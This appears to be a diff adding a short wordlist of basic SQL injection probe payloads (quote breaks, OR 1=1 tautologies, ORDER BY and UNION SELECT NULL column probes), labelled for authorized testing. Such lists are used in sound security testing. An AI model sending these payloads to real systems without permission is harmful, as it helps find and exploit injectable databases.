@@ -1,0 +1,11 @@
+# Common SQL injection payloads (for authorized testing only)
+'
+"
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT NULL--
+' AND 'a'='a
+' AND 'a'='b
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' UNION SELECT NULL,NULL--
